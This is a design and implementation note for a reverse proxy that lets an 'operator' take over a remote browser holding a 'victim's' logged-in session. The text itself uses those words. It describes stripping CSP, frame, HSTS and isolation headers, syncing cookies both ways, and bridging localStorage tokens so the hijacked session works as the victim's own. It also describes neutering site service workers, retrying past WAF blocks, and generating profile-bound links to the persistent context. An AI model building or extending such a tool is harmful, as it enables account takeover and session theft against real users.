# Proxy mirror — "redirect from browser to client" (no video streaming, same DOM)

## The requirement

The remote browser is a **persistent context** — it holds the client's (victim's)
logged-in data, cookies, storage. The operator's `client.html` must be able to
**control that browser session directly**. Today the only way the client "sees"
the browser is the DOM-capture mirror (serialize in the page → WS → re-render in
a blob iframe), which is slow and lossy, so driving the browser through it
requires patience: click → capture → send → re-render → *then* you see the
result.

## The idea

Stop copying the DOM out of the browser. **Redirect the client to the page
through our own origin** and let the page run itself there:

```
remote browser navigates to X
        │  (server already sends page_transition over the WS)
        ▼
client iframe.src = /m/<X>?sid=<session>          ← same-origin redirect
        │  api.py mirror_proxy(): fetch X upstream with the persistent
        │  context's cookies, rewrite every reference to /m/…, serve from
        │  OUR origin, strip CSP/X-Frame-Options, rewrite redirects
        ▼
the site's own JS runs inside the client iframe and talks to /m/…
        → clicks, forms, XHRs, push all go back through the proxy natively
        → Set-Cookie responses are synced BACK into the persistent context
          (context.add_cookies), so the remote browser and the proxy share
          one session — the client literally drives the persistent context's
          data
```

Same DOM *by construction* (same bytes, same origin), no screencast, no capture
round-trip in the control loop. Heavy JS sites (YouTube/TikTok) render natively
— the snapshot-host workaround becomes unnecessary in proxy mode.

## What exists now (P0, on by default)

- `proxy_mirror.py` — pure, unit-tested rewrite/cookie helpers
  (`rewrite_ref`, `rewrite_html_for_proxy`, `rewrite_css_for_proxy`,
  `rewrite_location`, `cookie_header_from_records`, `set_cookie_records`).
  - absolute/cross-origin refs → `/m/<full-url>`; protocol-relative →
    `/m/https:…`; root-absolute `/x` → `/m/<target-origin>/x`; relative refs are
    left alone because an injected `<base href="/m/<page>">` routes them.
  - srcset tokens, `<style>` bodies, inline `style` attrs, form `action`,
    `poster` all rewritten; meta CSP tags stripped; target service-worker
    registration neutered (our origin must own SW scope).
- `api.py` route `/m/{target:path}` (GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS):
  resolves the session from `?sid=`, reads the persistent context's cookies
  (`page.context.cookies()`), fetches upstream with httpx (20 s timeout,
  25 MB caps, redirects NOT followed — `Location` is rewritten to `/m/…`),
  strips CSP/XFO/HSTS/COOP/COEP/CORP headers, rewrites HTML/CSS, syncs
  `Set-Cookie` back into the context. `session_info` advertises
  `proxy_prefix: "/m/"` only when enabled.
- `client.html` proxy mode: on `session_info.proxy_prefix` + `page_transition`
  the iframe is redirected to the proxied URL (`openProxiedPage`), the outer
  `?url=` follows via `history.replaceState` (refresh keeps the page), and
  `full_document`/`dom_patch`/`requestResync` are suppressed while the live
  proxied page owns the iframe. If the proxied page doesn't load in 10 s, the
  client falls back to the capture mirror automatically.

Default ON: the proxy mirror is the primary live path. Kill switch / rollback:
`MIRROR_PROXY=0` → route 404s, no `proxy_prefix` advertised, client behaves
exactly as the capture-mirror-only build did. The DOM-capture
pipeline (fast serializer + deltas + snapshot hosts) remains fully intact as
the fallback and for archives (PCM/LPV/SingleFile/MHTML).

## Two-sided sync: proxy page <-> persistent remote browser

The client iframe and the remote browser must stay on the **same page**, with
the remote context as the source of session data.  Wiring:

- **Session id lives in the /m/ path**: `/m/<sid>/<encoded-target>`, not
  `?sid=`.  A query on the injected `<base>` is dropped by RFC 3986 relative
  resolution, so every runtime-built relative URL in page JS would lose the
  session; in the path it survives (`new URL('z.png', base)` keeps
  `/m/<sid>/…`).  Verified against WHATWG URL semantics in the tests.
  Every rewritten ref (attrs, srcset, CSS, redirects, the `<base>` itself)
  carries the sid, so **every** proxied subrequest is made with the persistent
  context's cookie jar (`context.cookies()` read per request), and upstream
  `Set-Cookie` is written back into the context (`add_cookies`).  Login state
  therefore comes from the remote browser, in both directions.
- **Client -> remote**: in proxy mode the iframe is the live same-origin site,
  so input is NATIVE (`setupIframeEventListeners` is a no-op while
  `state.proxyMode`) — clicks/forms/XHR go through `/m/` as real requests.
  The iframe's `load` listener (`handleProxyFrameLoad`) decodes the real target
  from `/m/<sid>/<url>`, updates `?url=`, and sends `{type:'proxy_sync', url}`;
  the server runs `session.sync_remote_url(url)` — a lightweight
  `page.goto(wait_until='commit')` with a same-URL guard — so the persistent
  browser lands on the same page and keeps accumulating cookies/storage.
- **Remote -> client**: a remote-side navigation fires `page_transition`; if
  the URL really changed the client redirects the iframe via
  `openProxiedPage(url)` (same-URL transitions are ignored, so the sync above
  doesn't cause a reload loop).  The DOM-capture pipeline still archives in
  the background but the client ignores `full_document`/`dom_patch`/`resync`
  while proxy mode owns the iframe; a 10s load watchdog falls back to the
  capture mirror if a proxied page fails to load.

## DOM capture stands down in proxy mode

With the proxy mirror owning the live view, the DOM-capture pipeline is
inactive by default (`is_capture_enabled()` = `not is_proxy_enabled()`;
override with `MIRROR_CAPTURE=1/0`): proactive captures and navigation
captures are skipped, `handle_navigation` in proxy mode is just a light
`page.goto` (the URL watcher still sends `page_transition` so the client
iframe redirects to `/m/<url>`), and capture only runs when the client
explicitly asks (`resync_request` — the 10s proxy-load-failure fallback).
Dead-browser capture failures log as warnings (session recovery owns them).

## Field fixes: Yahoo "Will be right back" 400 + icon parsing

- Upstream **400/403 (WAF) retry**: on a 400/403 the `/m/` route retries once
  with a clean minimal header set (UA + Accept + Accept-Language + Cookie) —
  Yahoo's error page was a WAF rejecting odd forwarded headers.
- **`/m/` URLs are unwrapped before hostname parsing** on the client
  (`unwrapProxyUrl`): the proxied iframe's `<base>`/baseURI is
  `/m/<sid>/<target>`, and parsing it raw leaked `domain=https:` to
  `/api/site/icon` (400) and `https://https/...`-style favicon candidates
  (ERR_NAME_NOT_RESOLVED).  Bogus scheme-as-host candidates are dropped.
- **Single-slash scheme typos** (`https:/favicon.ico`) are normalized and
  proxied instead of falling through to relative/direct resolution — both in
  the python rewriter and the injected router JS.

## Operational notes (bugs found in the field, fixed)

- `/m/` targets are **percent-encoded** (`quote(target, safe="/:")` — slashes
  raw so the injected `<base>` resolves relative refs correctly, `?&#%` encoded
  so a target's own query string stays inside the path). Without this, an
  iframe src like `/m/.../identifier?flowName=...` split at the `?` and the
  upstream got the bare path → Google **400 "malformed"**.
- The route re-attaches any real query params on the `/m/` request (minus
  `sid`) to the upstream URL, so even unencoded `/m/<url?query>` links work.
- `<script>` bodies are never rewritten (attr regexes apply only outside
  script blocks) — rewriting JS strings corrupted page code.
- The injected SW-neuter script is validated with `node --check` in the tests.
- Redirect responses strip COOP/CSP/XFO too (a COOP on a redirect from our
  http origin is what the browser's "origin was untrustworthy" warning was).
- Cookie values are sanitized (no CR/LF/`;`) before sending upstream.

## Session fidelity: links carry the persistent context, page storage bridges over

- **Profile-bound links**: `create_auth_link(..., profile_user_id=...)` stores
  the profile in the link; `/api/links/client?target=...&user_id=<profile>`
  embeds `&user_id=` in the generated `client.html?auth=...&url=...` URL, and
  the WS init also forces `init_data["user_id"] = link.profile_user_id`.
  client.html already honors `?user_id=` -> the client attaches to the SAME
  persistent user-data dir (`launch_persistent_context`), so the cookies and
  login state of the remote browser come with the link.  Admin's link
  generator has an optional profile field for this.
- **Cookies in the proxied page**: every `/m/` request sends
  `merge_cookie_headers(context jar, browser-attached mirror cookies)`; every
  upstream `Set-Cookie` is (a) synced into the persistent context AND
  (b) mirrored onto our own origin (`Path=/`), so `document.cookie` inside the
  proxied iframe works.  Browser-side cookie writes are synced back into the
  context too.
- **localStorage/sessionStorage bridge**: the injected router script seeds
  storage from the remote context (`GET /api/proxy/store?sid=&origin=`) and
  pushes every set/remove/clear back (`POST /api/proxy/store`) — applied to
  the remote page via CDP evaluate when it is on the same origin (proxy_sync
  keeps it there).  Sites that keep JWTs/tokens in storage now behave as if
  they were the remote browser.
- **Runtime URL routing**: on an insecure (http) origin a service worker is
  unavailable, so the router script injected at the top of `<head>` (before
  any page script, `node --check`-pinned in tests) patches `fetch`,
  `XMLHttpRequest.open`, `navigator.sendBeacon`, `EventSource`, `window.open`,
  and the `src`/`href`/`action`/`data` property setters to route absolute
  URLs through `/m/<sid>/...`.  `<meta http-equiv=refresh>` is rewritten in
  the HTML.  `Range` is forwarded for media.

## Known limits of P0 / next phases

- **P1 — dynamic request routing**: a service worker registered on our origin
  inside the client iframe will route `fetch`/XHR/ws to `/m/…` so page JS needs
  no rewriting at all (today only the initial document is rewritten; inline
  event handlers that build absolute URLs still work because of the base).
- **P2 — full session fidelity**: localStorage/sessionStorage of the persistent
  context are not yet shared into the proxied page (cookies are); sync via CDP
  or serve an init script that replays them.
- **P3 — WebSocket proxying** (`wss://` relay, e.g. `/mw/<sid>/<target>`) for
  chat/ticker pages — `websockets` is not installed in the runtime image, so
  WS URLs currently go direct (CORS may block them).  Media Range streaming is
  already forwarded.
- **P4 — handoff**: remote browser does login/setup through the proxy, then the
  client continues the session; capture mirror demoted to fallback/archive.
- Sites with meta-CSS we must keep, HSTS preload, or certificate pinning will
  fail through the proxy → automatic per-page fallback to the capture mirror.

## Tests

- `tests/test_proxy_mirror.py` — 34 checks on the pure rewriter/cookies.
- `tests/test_proxy_mirror_client.cjs` — 11 checks on the client wiring.
